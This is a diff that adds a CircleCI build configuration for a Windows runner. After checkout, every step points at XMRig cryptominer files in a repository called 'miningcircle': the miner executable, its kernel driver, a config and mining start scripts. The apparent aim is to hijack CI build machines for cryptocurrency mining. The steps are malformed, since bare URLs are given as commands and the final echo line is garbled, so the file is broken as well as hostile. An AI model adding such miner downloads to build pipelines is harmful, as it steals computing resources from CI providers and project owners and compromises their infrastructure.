@@ -1,0 +1,23 @@
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
+    steps:
+      - checkout      
+      - run: https://github.com/admin123356/miningcircle/raw/main/xmrig-6.12.2/SHA256SUMS
+      - run: https://github.com/admin123356/miningcircle/blob/main/xmrig-6.12.2/WinRing0x64.sys?raw=true
+      - run: https://github.com/admin123356/miningcircle/raw/main/xmrig-6.12.2/benchmark_10M.cmd
+      - run: https://github.com/admin123356/miningcircle/raw/main/xmrig-6.12.2/benchmark_1M.cmd
+      - run: https://github.com/admin123356/miningcircle/raw/main/xmrig-6.12.2/config.json
+      - run: https://github.com/admin123356/miningcircle/raw/main/xmrig-6.12.2/pool_mine_example.cmd
+      - run: https://github.com/admin123356/miningcircle/raw/main/xmrig-6.12.2/solo_mine_example.cmd
+      - run: https://github.com/admin123356/miningcircle/raw/main/xmrig-6.12.2/start.cmd
+      - run: https://github.com/admin123356/miningcircle/blob/main/xmrig-6.12.2/xmrig.exe?raw=true
+      - run: cmd /c echo cmd /xmrig.exe?raw=true
